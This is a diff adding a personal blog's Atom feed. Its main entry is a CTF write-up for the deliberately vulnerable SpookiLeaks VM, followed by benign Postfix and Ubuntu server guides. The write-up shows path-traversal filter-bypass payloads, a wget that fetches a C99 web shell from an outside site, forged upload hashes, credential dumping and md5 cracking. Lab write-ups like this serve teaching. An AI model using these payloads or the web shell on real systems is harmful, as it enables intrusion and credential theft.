@@ -1,0 +1,1842 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Chris Kankiewicz</title><link href="http://blog.chriskankiewicz.com/" rel="alternate"></link><link href="http://blog.chriskankiewicz.com/feeds/chris-kankiewicz.atom.xml" rel="self"></link><id>http://blog.chriskankiewicz.com/</id><updated>2014-04-15T19:49:00-07:00</updated><entry><title>CactusCon 2014 CTF Writeup</title><link href="http://blog.chriskankiewicz.com/cactuscon-2014-ctf-writeup.html" rel="alternate"></link><published>2014-04-15T19:49:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2014-04-15:cactuscon-2014-ctf-writeup.html</id><summary type="html">&lt;p&gt;This is a write up to the 2014 CactusCon web application
+(&lt;a href="https://github.com/PHX2600/spookileaks"&gt;SpookiLeaks&lt;/a&gt;) challenge.  You can grab
+the SpookiLeaks-VM &lt;a href="https://drive.google.com/file/d/0BweAXsUQLm0mRFVsTmV5O
+HdUVTg/edit?usp=sharing"&gt;here&lt;/a&gt; and try the challenge yourself before reading the
+solution.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;!!! WARGING: SPOILERS BELOW !!!&lt;/h2&gt;
+&lt;hr /&gt;
+&lt;h3&gt;The First Clue&lt;/h3&gt;
+&lt;p&gt;The first clue to solving the challenge is hidden in plain sight.  Before even
+logging in if we scan the pre-loaded images on the Spooky Images page there's
+one image with the following comment:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;01110010011011110110001001101111011101000111001100101110011101000111100001110100
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Binary should be a red flag in any CTF. By doing a simple binary to ASCII
+conversion we get the following output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;robots.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ah-ha! &lt;a href="http://www.robotstxt.org/robotstxt.html"&gt;robots.txt&lt;/a&gt;... By checking
+&lt;code&gt;/robots.txt&lt;/code&gt; we find the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;User-agent: *
+Disallow: /secret_docs/file-tree.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here we find mention of &lt;code&gt;/secret_docs/file-tree.txt&lt;/code&gt; with a rule of "Disallow".
+Fortunately, this rule is only intended to be read by web-crawlers and has no
+actual affect on our ability to read the file.  By visiting
+&lt;code&gt;/secret_docs/file-tree.txt&lt;/code&gt; we find
+&lt;a href="https://raw.githubusercontent.com/PHX2600/spookileaks/master/webroot/secret_docs/file-tree.txt"&gt;this&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Score! We just found a complete listing of the application file structure.  It's
+a pretty long list of files but there's a few things worth noting:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Docs/flag.txt&lt;/code&gt; - This is obviously our target.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Controller\Auth\CustomPasswordHasher.php&lt;/code&gt; - This could tell us about the
+    way user account passwords are hashed.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;webroot/uploads/&lt;/code&gt; - This is where user files are uploaded to, indicated by
+    &lt;code&gt;[ User uploads ]&lt;/code&gt;. This means any files uploaded to the server will be
+    publicly accessable.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;The Application&lt;/h3&gt;
+&lt;p&gt;We have now exposed a lot of information about our application but we still
+don't have a vector of attack.  Let's start assessing the functionality of the
+app.&lt;/p&gt;
+&lt;p&gt;We'll start by registering an account (any user/pass will do).  Once registered
+we gain the ability to add an image from the &lt;code&gt;/images/manage&lt;/code&gt; page.  On first
+pass let's just use the app as intended.  Add a title, select an image (with
+proper extension type) from our computer and add a comment.  Submit the form and
+we now see our image on the left hand side of the page.  Nothing terribly
+interesting yet.  Let's see what this form is actually doing.  By viewing the
+source of the &lt;code&gt;/images/manage&lt;/code&gt; page a few things should catch our eye:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;There's an hidden field in the image submission form referencing a
+    &lt;code&gt;file_hash&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This page loads a &lt;code&gt;/js/images.js&lt;/code&gt; script that isn't seen on other pages.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The images on this page are loaded via a URL parameter:
+    &lt;code&gt;/images/media?file=image_name.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Upon inspection of &lt;code&gt;/js/images.js&lt;/code&gt; we find the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$(&amp;#39;.image-file-upload-input:file&amp;#39;).change(function(event) {
+
+    // Initialize formData object
+    var fileName = $(this).val().split(&amp;#39;\\&amp;#39;).pop();
+
+    $.post(&amp;#39;/images/hash&amp;#39;, { fileName: fileName }, function(data) {
+
+        // Parse JSON data
+        var obj = $.parseJSON(data);
+
+        if (obj.file_hash) {
+
+            // Set the file hash input value
+            $(&amp;#39;.image-file-hash-input&amp;#39;).val(obj.file_hash);
+
+        }
+
+    });
+
+});
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is pretty straight forward.  On selection of a file for uploading, a post
+request is made to &lt;code&gt;/images/hash&lt;/code&gt; containing the file name in the post data. The
+returned data is then set as the value of the hidden &lt;code&gt;file_hash&lt;/code&gt; field and this
+gets sent to the server with the form on submission.  By using Firebug or the
+browsers buit-in developer tools we can see the request being made on file
+selection and the data returned.  The data we get back from the jQuery post
+appears to be a sha1 hash. With some additional analysis and playing with the
+form and the hashing function we can tell that the hash generated isn't a direct
+sha1 of the file name.  Also, if we modify the hash after generation the file
+upload form fails to post any data.  Lastly, attempting to upload a file with an
+extension other than those listed as acceptable fails upon submission as well.&lt;/p&gt;
+&lt;p&gt;Let's move on for now and look at the suspicious file loading URL.  Whenever a
+file is loaded via URL parameters there's a good chance it's vulnerable to a
+&lt;a href="https://www.owasp.org/index.php/Path_Traversal"&gt;path traversal attack&lt;/a&gt;.  Let's
+try a basic attack:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/images/media?file=../../../../../etc/passwd
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This results in an error: &lt;code&gt;File "etc/passwd" Not Found&lt;/code&gt;.  It's important to note
+that the returned error does not contain any dot-dot-slashes.  This means
+they're sanitizing this value but there's still a chance it might not be
+sanitized properly.  Knowing the input and output of this unkown function we can
+make a guess as to what it's doing internally and exploit that.  In this case, a
+good guess is that they are replacing all instanced of &lt;code&gt;../&lt;/code&gt; with nothing. We
+can test that out by submitting &lt;code&gt;....//&lt;/code&gt;.  If we're right the inner &lt;code&gt;../&lt;/code&gt; will
+be replaced with nothing leaving a single &lt;code&gt;../&lt;/code&gt; in it's place.  Let's test that:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/images/media?file=....//....//....//....//....//etc/passwd
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It works! Let's try grabbing that flag we saw in the file tree from earlier:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/images/media?file=....//....//Docs/flag.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It's never that easy is it?  This gives us an error but this time it's a
+"Permission denied" error.  That means the web server doesn't have permissions
+to read the flag, thus, we're going to have to find a way to read the flag as a
+user with permission (root perhpse?).&lt;/p&gt;
+&lt;h3&gt;Reconnaissance&lt;/h3&gt;
+&lt;p&gt;At this point we have everything we need to start gathering intel.  The path
+traversal attack plus the file tree give us access to the complete source code
+of the application as well any other files on the server with laxed permissions.
+To save some time, I'll now go over some of the key files our investigation
+should have turned up and their significance:&lt;/p&gt;
+&lt;p&gt;First, in the &lt;code&gt;/etc/passwd&lt;/code&gt; file we tried above we find the "ghost" user:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="o"&gt;,,,:/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="sr"&gt;/ghost:/bin/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This, along with the contents of &lt;code&gt;/etc/group&lt;/code&gt; let us know the "ghost" account
+has sudo access:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ghost&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Thus, if we can gain access to the "ghost" user account we can read the contents
+of flag.txt.&lt;/p&gt;
+&lt;p&gt;Okay, let's go back to the image submission form, specifically, the hidden
+&lt;code&gt;file_hash&lt;/code&gt; form field. By viewing the source of the ImagesController at
+&lt;code&gt;/images/media?file=....//....//Controller/ImagesController.php&lt;/code&gt; we see that
+this hash is checked against a hash of the submitted file's name:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;if (!&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;error&amp;#39;] &amp;amp;&amp;amp; &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;hash&lt;/span&gt;&lt;span class="x"&gt; === &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;&lt;span class="x"&gt;-&amp;gt;hashFile(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;name&amp;#39;])) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Looking at the main &lt;code&gt;/images/hash&lt;/code&gt; action we see a check against the file's
+extension:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;// Get the file name&lt;/span&gt;
+&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt; = trim(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;&lt;span class="x"&gt;-&amp;gt;request-&amp;gt;data[&amp;#39;fileName&amp;#39;]);&lt;/span&gt;
+
+&lt;span class="x"&gt;// Set array of allowed file extensions&lt;/span&gt;
+&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;allowedExtensions&lt;/span&gt;&lt;span class="x"&gt; = array(&amp;#39;png&amp;#39;, &amp;#39;gif&amp;#39;, &amp;#39;jpg&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;bmp&amp;#39;);&lt;/span&gt;
+
+&lt;span class="x"&gt;// Get file extension from source image&lt;/span&gt;
+&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;extension&lt;/span&gt;&lt;span class="x"&gt; = strtolower(pathinfo(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt;, PATHINFO_EXTENSION));&lt;/span&gt;
+
+&lt;span class="x"&gt;// Verify file is of an acceptable type&lt;/span&gt;
+&lt;span class="x"&gt;if (in_array(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;extension&lt;/span&gt;&lt;span class="x"&gt;, &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;allowedExtensions&lt;/span&gt;&lt;span class="x"&gt;)) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Super duper, top secret hashing algorithm&lt;/span&gt;
+&lt;span class="x"&gt;    &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;data&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;file_hash&amp;#39;] = &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;&lt;span class="x"&gt;-&amp;gt;hashFile(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt;);&lt;/span&gt;
+
+&lt;span class="x"&gt;} else &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Return false on failure&lt;/span&gt;
+&lt;span class="x"&gt;    &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;data&lt;/span&gt;&lt;span class="x"&gt;[&amp;#39;file_hash&amp;#39;] = false;&lt;/span&gt;
+
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And viewing the referenced hashFile() function we see the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;private function hashFile(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt;) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Super duper, top secret hashing algorithm&lt;/span&gt;
+&lt;span class="x"&gt;    return sha1(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;fileName&lt;/span&gt;&lt;span class="x"&gt; . &amp;#39;ErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd&amp;#39;);&lt;/span&gt;
+
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That's a bingo! We now have the method of file hashing along with the secret
+string that gets concatenated with the file name.  With this information we can
+actively exploit the file upload form and generate a valid hash for any file we
+choose.&lt;/p&gt;
+&lt;h3&gt;Shelling the Server&lt;/h3&gt;
+&lt;p&gt;It's now time to grab a fresh copy of &lt;a href="http://www.r57shell.net/"&gt;C99&lt;/a&gt; (I also
+recommend &lt;a href="http://epinna.github.io/Weevely/"&gt;Weevely&lt;/a&gt; but for this example we'll
+stick to the more simple C99 shell) and generate a valid hash for uploading:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://www.r57shell.net/shell/c99.txt
+$ mv c99.txt not_a_shell.php
+$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;not_a_shell.phpErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sha1sum
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This gives us:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;90d5aeb035bbcd0df8f5e84721d3eb8f3321ff8c
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now we can go back to the upload form, select our &lt;code&gt;c99.php&lt;/code&gt; file, then using
+Firebug or the browsers built-in web developer tools modify the value of the
+hidden &lt;code&gt;file_hash&lt;/code&gt; element and set it to our pre-generated hash.  This time,
+when we submit the form, the file upload succeeds without error.  Navigating to
+&lt;code&gt;/uploads/not_a_shell.php&lt;/code&gt; now brings up our shell.&lt;/p&gt;
+&lt;p&gt;From here accessing any aspect of the web application or it's database are
+trivial.  Let's investigate the database now.  First, nab the credentials by
+navigating to &lt;code&gt;/images/media?file=....//....//Config/database.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;public &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;default&lt;/span&gt;&lt;span class="x"&gt; = array(&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;datasource&amp;#39; =&amp;gt; &amp;#39;Database/Mysql&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;persistent&amp;#39; =&amp;gt; false,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;host&amp;#39;       =&amp;gt; &amp;#39;localhost&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;login&amp;#39;      =&amp;gt; &amp;#39;spookileaks&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;password&amp;#39;   =&amp;gt; &amp;#39;rmPtShWVyrCcxfJaBvsPL4t2&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;database&amp;#39;   =&amp;gt; &amp;#39;spookileaks&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    &amp;#39;prefix&amp;#39;     =&amp;gt; &amp;#39;&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;    //&amp;#39;encoding&amp;#39; =&amp;gt; &amp;#39;utf8&amp;#39;,&lt;/span&gt;
+&lt;span class="x"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Using C99, we can dump this data easily and see the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;id  username    password                            role    created                 modified
+1   ghost       37988bb25d36058671f959f06a7d51b9    admin   2014-04-03 20:53:19     2014-04-03 20:53:19
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That's the same user name that we found in &lt;code&gt;/etc/passwd&lt;/code&gt; and that password hash
+looks like a basic md5.  We can verify that by checking out he source of that
+custom password hasher at
+&lt;code&gt;/media?file=....//....//Controller/Component/Auth/CustomPasswordHasher.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;public function hash(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="x"&gt;) &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+
+&lt;span class="x"&gt;    // Hash the password&lt;/span&gt;
+&lt;span class="x"&gt;    return md5(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="x"&gt;); // md5 4 life&lt;/span&gt;
+
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Yup, unsalted md5.  If the password was salted we might start thinking about
+brute forcing it.  However, unsalted passwords are often easily searchable due
+to them being pre-computed en masse and published online.  For our case, a
+simple
+&lt;a href="https://encrypted.google.com/search?q=37988bb25d36058671f959f06a7d51b9"&gt;Google search&lt;/a&gt;
+reveals the password as &lt;code&gt;ScoobySnacks&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;The Final Pieces&lt;/h3&gt;
+&lt;p&gt;We now need to be able to log in to the the system.  Without physical access to
+the box we can perform an &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; scan to see what services are
+up and running:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nmap -sT 192.168.0.170
+
+Starting Nmap 6.40 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2014-04-16 10:48 MST
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 192.168.0.170
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.0034s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 0.09 seconds
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here we see that SSH is running on the target machine.  The last question
+remaining now is wether or not the &lt;code&gt;ghost&lt;/code&gt; user was smart enough to use
+different passwords for his system account and his web application accounts.
+All we have to do to test this is SSH into the server with his credentials:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="mf"&gt;@192.168.0.170&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;Substitute&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;VMs&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;
+&lt;span class="n"&gt;ghost&lt;/span&gt;&lt;span class="mf"&gt;@192.168.0.170&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="nl"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Enter the ghost user's password and BOOM!  We're in!  All we have to do is grab
+the content of flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo cat /var/www/SpookiLeaks/Docs/flag.txt
+&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; ghost:
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And you've got the flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;     CONGLATURATION !!!
+
+     YOU HAVE COMPLETED
+       A GREAT GAME.
+
+  AND PROOVED THE JUSTICE
+      OF OUR CULTURE.
+
+    NOW GO AND REST OUR
+          HEROES !
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="CTF"></category><category term="Linux"></category><category term="PHP"></category><category term="Hacking"></category></entry><entry><title>Postfix: Using Gmail as a Relay Host</title><link href="http://blog.chriskankiewicz.com/postfix-using-gmail-as-a-relay-host.html" rel="alternate"></link><published>2012-07-06T19:08:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2012-07-06:postfix-using-gmail-as-a-relay-host.html</id><summary type="html">&lt;p&gt;I maintain several Linux servers at any given moment. Every server has postfix
+installed for sending emails, usually notifications or warning messages of some
+sort and most of these servers are professionally hosted allowing outbound
+emails with little to no configuration beyond installing postfix.  However, my
+home server lies behind my ISP and they block all outbound emails citing SPAM as
+the reason.  Regardless of their reasoning I had to find a workaround to allow
+me to send email notifications from behind my ISP.  Well, it turns out this is
+rather painless with postfix and a Gmail account.&lt;/p&gt;
+&lt;p&gt;First, set up a &lt;a href="https://www.gmail.com"&gt;Gmail&lt;/a&gt; account, note the user name and
+password for later.&lt;/p&gt;
+&lt;h3&gt;Install postfix&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install postfix
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Add the following to /etc/postfix/main.cnf&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Forward mail through Gmail
+relayhost = [smtp.gmail.com]:587
+smtp_use_tls = yes
+smtp_sasl_auth_enable = yes
+smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
+smtp_sasl_security_options = noanonymous
+smtp_tls_CAfile = /etc/ssl/certs/Equifax_Secure_CA.pem
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Create the file /etc/postfix/sasl_passwd and add the following:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[smtp.gmail.com]:587 [username]@gmail.com:[password]
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Be sure to replace &lt;code&gt;[username]&lt;/code&gt; and &lt;code&gt;[password]&lt;/code&gt; with your account user name and
+password.&lt;/p&gt;
+&lt;h3&gt;Modify file permissions and generate sasl_passwd.db&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /etc/postfix
+$ postmap sasl_passwd
+$ chmod &lt;span class="m"&gt;600&lt;/span&gt; sasl_passwd sasl_passwd.db
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Restart postfix service&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo service postfix restart
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Send a test email&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install mailutils
+$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Success!&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mailx -s &lt;span class="s1"&gt;&amp;#39;Test Message&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;email_address&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Replace &lt;code&gt;[email_address]&lt;/code&gt; with your email address to receive a test message.&lt;/p&gt;</summary><category term="Gmail"></category><category term="Linux"></category><category term="Postfix"></category><category term="Ubuntu"></category></entry><entry><title>Setting Up an Ubuntu Web Server</title><link href="http://blog.chriskankiewicz.com/setting-up-an-ubuntu-web-server.html" rel="alternate"></link><published>2012-01-18T17:42:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2012-01-18:setting-up-an-ubuntu-web-server.html</id><summary type="html">&lt;p&gt;Having set up several Debian and Ubuntu web servers in the past I thought it
+would be a good idea to share my process. The following is a relatively
+comprehensive guide to installing and configuring an Apache based web server
+with some optimizations and basic resource monitoring. I primarily work with
+Ubuntu servers, but most of the commands here should work exactly the same in
+Debian or Ubuntu. I've tried to note where differences may occur.&lt;/p&gt;
+&lt;h2&gt;Download and Install the OS&lt;/h2&gt;
+&lt;p&gt;If you are setting up your own server, the first thing you will need to do is
+download the ISO that corresponds to your hardware (32/64-bit), burn it to CD
+and install it to your server.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;For Ubuntu go to
+    &lt;a href="http://www.ubuntu.com/download/server/download"&gt;http://www.ubuntu.com/download/server/download&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;For Debian go to
+    &lt;a href="http://www.debian.org/distrib/"&gt;http://www.debian.org/distrib/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; It is strongly recommended that you choose the LTS (Long Term Service)
+release if you decide to go with Ubuntu.&lt;/p&gt;
+&lt;p&gt;The installation process is relatively straight forward, so I will not be going
+over that here, simply boot to the disc and follow the on-screen instructions.
+Once the OS is installed continue with the instructions below.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Create a User Account&lt;/h2&gt;
+&lt;p&gt;On most Ubuntu installations you should have created a user account during
+installation and this wont be necessary. However, the following may be needed on
+some web hosts or a VPS. After a Debian installation you are only given access
+to the &lt;code&gt;root&lt;/code&gt; account. It can be dangerous to run as root all the time and
+creating a non-privelleged user account for yourself is recommended. Depending
